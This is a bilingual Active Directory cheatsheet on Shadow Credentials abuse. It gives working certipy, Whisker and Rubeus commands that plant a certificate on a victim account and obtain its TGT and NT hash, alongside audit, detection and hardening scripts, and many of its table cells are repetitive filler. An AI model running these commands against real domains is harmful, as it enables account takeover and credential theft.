---
aliases:
  - Shadow Credentials
  - msDS-KeyCredentialLink
  - Whisker
  - certipy shadow
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
  - "[[Shadow Credentials]]"
---
# AD - Delegation Enumeration - Shadow Credentials

***

## Concept Overview

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Shadow Credentials = NgC abuse | Modern technique | Standard. |
| `msDS-KeyCredentialLink` attribute | NgC public key entries | LDAP. |
| Atacante adds own cert to victim → auth as victim | Standard chain | Critical. |
| Modern Windows 10/11 + Server 2016+ required | NgC support | Standard. |
| Stealthier than ForceChangePassword | No password reset | OPSEC. |
| Per-user multiple keys | Multi-cert support | Edge. |
| ACL needed: GenericAll, GenericWrite, or WriteProperty msDS-KeyCredentialLink | Standard | Standard. |
| Tool: certipy shadow | Standard | Standard. |
| Tool: Whisker | Standard | Standard. |
| Tool: ntlmrelayx --shadow-credentials | Adjacent | Adjacent. |
| Detection: msDS-KeyCredentialLink modify | Defender | Adjacent. |
| BloodHound `AddKeyCredentialLink` edge | Modern | Tool. |
| Adjacent: Shadow Credentials hub | Cross-ref | Adjacent. |
| Modern: extreme alerting | Defender | Standard. |
| Cleanup: remove cert from KeyCredentialLink | Standard | OPSEC. |
| Audit log retention | Standard | Adjacent. |
^ad-shadowcred-concept

### Shadow Credentials discovery

```bash
# Users with msDS-KeyCredentialLink set
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=user)(msDS-KeyCredentialLink=*))" \
  samAccountName

# Computers with msDS-KeyCredentialLink (rare)
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(msDS-KeyCredentialLink=*))" \
  cn dNSHostName
```

```powershell
# RSAT
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where {$_.'msDS-KeyCredentialLink'} |
  Select Name,SamAccountName

Get-ADComputer -Filter * -Properties msDS-KeyCredentialLink |
  Where {$_.'msDS-KeyCredentialLink'} |
  Select Name
```

___

## msDS-KeyCredentialLink Attribute

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Multi-valued binary attribute | LDAP | Standard. |
| Each entry: cert + metadata | Binary blob | Standard. |
| KeyCredential blob structure | Microsoft format | Standard. |
| Supports multiple entries per user | Edge | Edge. |
| Standard NgC = Windows Hello / FIDO2 | Modern auth | Standard. |
| Atacante adds custom cert | Same attribute | Critical. |
| `Owner Self` extended right by default | Self-modify | Standard. |
| Default: user/computer modifies own | Standard | Standard. |
| ACL allows others to write = vuln | ACL combo | Critical. |
| Cross-correlate with priv | Standard | Audit. |
| BloodHound `AddKeyCredentialLink` edge | Modern | Tool. |
| Detection: msDS-KeyCredentialLink change events | Defender | Adjacent. |
| Modern: monitor closely | Best practice | Standard. |
| Audit: per-quarter review | Standard | Compliance. |
| Cleanup: remove unauthorized entries | Standard | OPSEC. |
| Authenticated read | Default permissive | Standard. |
^ad-shadowcred-attr

### Attribute inspection

```powershell
# Decode KeyCredentialLink (DSInternals)
Install-Module DSInternals
Import-Module DSInternals

$user = Get-ADUser victim -Properties msDS-KeyCredentialLink
foreach ($kc in $user.'msDS-KeyCredentialLink') {
  $decoded = ConvertFrom-ADKeyCredential $kc
  $decoded | Format-List
}

# Output: Owner, CreationTime, KeyId, KeyMaterial, Usage, Source
```

___

## Shadow Credentials Attack Chain

| **Step** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| 1. Identify target with WriteProperty msDS-KeyCredentialLink ACL | ACL audit | Standard. |
| 2. Generate cert | Tool generates auto | Standard. |
| 3. Add cert to victim's msDS-KeyCredentialLink | LDAP write | Critical. |
| 4. Request TGT using cert (PKINIT) | Standard | Standard. |
| 5. Use TGT to access resources as victim | Pass-the-Ticket | Standard. |
| `certipy shadow auto` | Standard tool | Standard. |
| `certipy shadow add` | Manual mode | Standard. |
| `certipy shadow list` | Enum existing | Standard. |
| `certipy shadow remove` | Cleanup | Standard. |
| Whisker (Windows) | Adjacent | Standard. |
| `ntlmrelayx --shadow-credentials` | Combo with relay | Adjacent. |
| Cross-correlate target priv | Standard | Audit. |
| Detection: PKINIT events | Defender | Adjacent. |
| Adjacent: Shadow Credentials hub | Cross-ref | Adjacent. |
| Modern Defender for Identity NgC alerts | Modern | Defender. |
| Cleanup: certipy shadow remove | Standard | OPSEC. |
^ad-shadowcred-chain

### Shadow Credentials chain

```bash
# Linux certipy (recommended)
certipy shadow auto -u user@dom.local -p pass -account victim

# Output: TGT for victim
# Cleanup happens automatically with 'auto' mode

# Manual mode
certipy shadow add -u user@dom.local -p pass -account victim
# Now have cert + ability to PKINIT as victim

# Use cert for auth
certipy auth -pfx victim.pfx -username victim
# Output: TGT + NT hash

# Cleanup
certipy shadow remove -u user@dom.local -p pass -account victim -device-id <id>
```

```cmd
:: Windows Whisker
Whisker.exe add /target:victim
:: Use cert for PKINIT
Rubeus.exe asktgt /user:victim /certificate:base64cert /password:CertPass /ptt
```

___

## ACL Required for Shadow Credentials

| **ACE** | **Effect** | **Notas** |
|:---:|:---:|:---:|
| GenericAll on target | Includes WriteProperty msDS-KeyCredentialLink | Standard. |
| GenericWrite on target | Same | Standard. |
| WriteProperty msDS-KeyCredentialLink | Granular | Specific. |
| WriteDACL on target | 2-step | Adjacent. |
| WriteOwner on target | 3-step | Adjacent. |
| AllExtendedRights on target | Includes | Standard. |
| Self extended right | Computer/User self-modify | Standard. |
| Default: target modifies own | Standard | Standard. |
| ACL via group membership | Indirect | Standard. |
| BloodHound `AddKeyCredentialLink` edge | Modern | Tool. |
| Cross-correlate with priv | Standard | Audit. |
| Detection: ACL modify on KeyCredentialLink | Defender | Adjacent. |
| Per-quarter ACL audit | Standard | Compliance. |
| Modern: minimal modify rights | Hardening | Standard. |
| Cleanup: revert ACL changes | Standard | OPSEC. |
| Compliance: documented baseline | Standard | Adjacent. |
^ad-shadowcred-acl

### Required ACL audit

```powershell
# Find principals with WriteProperty msDS-KeyCredentialLink on target
$target = "CN=victim,CN=Users,DC=dom,DC=local"
$keyCredGUID = "5b47d60f-6090-40b2-9f37-2a4de88f3063"  # msDS-KeyCredentialLink

Get-Acl "AD:$target" | Select -ExpandProperty Access |
  Where {
    $_.AccessControlType -eq "Allow" -and
    (
      $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|AllExtendedRights" -or
      ($_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectType -eq $keyCredGUID)
    ) -and
    $_.IdentityReference.Value -notmatch "Domain Admins|Enterprise Admins|Administrators|SYSTEM|BUILTIN|Self"
  } |
  Select IdentityReference,ActiveDirectoryRights
```

___

## BloodHound AddKeyCredentialLink Edge

| **Edge** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `AddKeyCredentialLink` | Direct write permission | Modern edge. |
| `MemberOf` chain | Indirect via group | Standard. |
| `GenericAll` on target | Includes | Adjacent. |
| `GenericWrite` on target | Same | Adjacent. |
| BloodHound CE 5.x+ Shadow Cred support | Modern | Tool. |
| Cypher: find Shadow Cred paths | Standard | Tool. |
| Visual graph | Per-edge | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| BHCE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| Pre-built Shadow Cred queries | Standard | Tool. |
| Cross-correlate priv | Standard | Tool. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: continuous BHCE | Defender | Standard. |
| Compliance: Shadow Cred baseline | Standard | Adjacent. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
^ad-shadowcred-bh

### BloodHound Shadow Credentials queries

```cypher
// All AddKeyCredentialLink relationships
MATCH (src)-[:AddKeyCredentialLink|MemberOf*1..]->(target:User)
RETURN src.name, target.name

// Atacante can Shadow Cred high-value
MATCH (u {owned: true})-[:AddKeyCredentialLink|MemberOf|GenericAll|GenericWrite*1..]->(target)
WHERE target.adminCount = true
RETURN u.name, target.name

// Path: owned → Shadow Cred → DA
MATCH (u {owned: true}), (target:User)
WHERE target.adminCount = true
MATCH p=shortestPath((u)-[:AddKeyCredentialLink|MemberOf|GenericAll|GenericWrite*1..]->(target))
RETURN p
```

___

## Existing Shadow Credentials Audit

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Users with msDS-KeyCredentialLink populated | Standard or attack? | Audit. |
| Computers with msDS-KeyCredentialLink | Edge | Audit. |
| Multiple key entries per user | Edge | Audit. |
| Recent additions | Atacante plant or legit | Defender. |
| Standard NgC: Windows Hello, FIDO2 | Legit | Standard. |
| Atacante cert: not from legit source | Attack | Audit. |
| `Source` field in decoded KC | Indicates origin | Standard. |
| Cross-correlate with auth events | Standard | Defender. |
| Detection: PKINIT auth events | Defender | Adjacent. |
| Audit: per-user KC review | Standard | Compliance. |
| Cleanup: remove unauthorized | Standard | OPSEC. |
| Modern Defender for Identity Shadow Cred alerts | Modern | Defender. |
| BloodHound continuous | Modern | Tool. |
| Compliance: documented baseline | Standard | Adjacent. |
| Cross-correlate priv | Standard | Audit. |
| Modern: extreme alerting | Best practice | Standard. |
^ad-shadowcred-audit

### KC audit script

```powershell
# All users + computers with KC populated
$report = @()

Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where {$_.'msDS-KeyCredentialLink'} |
  ForEach-Object {
    $user = $_
    $kcCount = $user.'msDS-KeyCredentialLink'.Count
    $report += [PSCustomObject]@{
      Type = "User"
      Name = $user.Name
      SamAccountName = $user.SamAccountName
      KCEntries = $kcCount
      AdminCount = $user.AdminCount
    }
  }

Get-ADComputer -Filter * -Properties msDS-KeyCredentialLink |
  Where {$_.'msDS-KeyCredentialLink'} |
  ForEach-Object {
    $comp = $_
    $kcCount = $comp.'msDS-KeyCredentialLink'.Count
    $report += [PSCustomObject]@{
      Type = "Computer"
      Name = $comp.Name
      SamAccountName = $comp.SamAccountName
      KCEntries = $kcCount
      AdminCount = $null
    }
  }

$report | Format-Table -AutoSize
$report | Where {$_.AdminCount -eq 1} | Format-Table -AutoSize  # Privileged
```

___

## Detection & Mitigations

| **Detection** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Event ID 4742 (computer change) | Adjacent | Defender. |
| Event ID 4738 (user change) | Adjacent | Defender. |
| Event ID 4768 (TGT request via PKINIT) | Direct | Defender. |
| Microsoft Defender for Identity Shadow Cred alert | Modern | Defender. |
| BloodHound continuous monitoring | Modern | Tool. |
| Per-quarter KC audit | Standard | Compliance. |
| Modern: extreme alerting on PKINIT | Defender | Standard. |
| Cross-correlate auth events | Standard | Defender. |
| Audit: minimize Shadow Cred capability | Best practice | Standard. |
| Modern: documented per-user NgC | Standard | Adjacent. |
| Compliance: NgC baseline | Standard | Adjacent. |
| Cleanup: stale KC entries | Hygiene | Standard. |
| Detection: ADCS NgC + cert template | Adjacent | Defender. |
| Modern: 24x7 monitoring | Defender | Standard. |
| Honeypot accounts: alert on KC modify | Defender plant | Detection. |
| Cross-trust Shadow Cred | Cross-forest | Critical. |
^ad-shadowcred-detection

### Hardening + detection

```powershell
# Audit + remove stale KC entries
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where {$_.'msDS-KeyCredentialLink'} |
  ForEach-Object {
    $user = $_.SamAccountName
    Write-Host "User $user has $($_.'msDS-KeyCredentialLink'.Count) KC entries"
    # Manual review: legit Windows Hello vs attacker plant
  }

# Detection: alert on msDS-KeyCredentialLink modify (Event 5136)
# Microsoft Defender for Identity:
# Alert: "Suspicious Kerberos certificate (NgC) authentication"
```

___

## Modern: NgC = Windows Hello

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| NgC = Next-Generation Credentials | Modern AD auth | Standard. |
| Backed by TPM key | Hardware-bound | Standard. |
| Windows Hello for Business | Modern auth | Standard. |
| FIDO2 / WebAuthn integration | Modern | Standard. |
| msDS-KeyCredentialLink for storage | LDAP | Standard. |
| Multiple devices per user | Phone, laptop, etc. | Standard. |
| Server 2016+ schema requirement | Required | Standard. |
| Modern hardening: prefer NgC over passwords | Best practice | Standard. |
| Atacante abuse: same attribute | Cert add | Standard. |
| Distinguishing legit vs attacker entries | Source field | Audit. |
| Defender: PKINIT events monitoring | Standard | Defender. |
| Compliance: NgC adoption baseline | Standard | Adjacent. |
| Adjacent: Windows Hello docs | Microsoft | Reference. |
| Per-user multiple devices | Standard | Standard. |
| Stale device cleanup | Hygiene | Standard. |
| Cross-correlate device join events | Standard | Defender. |
^ad-shadowcred-ngc

### NgC vs Shadow Cred attack

```
Legitimate NgC (Windows Hello):
- User registers device (laptop/phone)
- Device's TPM key stored in msDS-KeyCredentialLink
- User can PKINIT auth from registered device

Atacante abuse (Shadow Cred):
- Atacante generates cert (no TPM)
- Adds cert to victim's msDS-KeyCredentialLink (via ACL)
- Atacante PKINIT auths as victim
- Difference: Source field doesn't match registered device

Detection: PKINIT auth from non-typical source/time/location
Microsoft Defender for Identity: ML-based anomaly detection
```

***
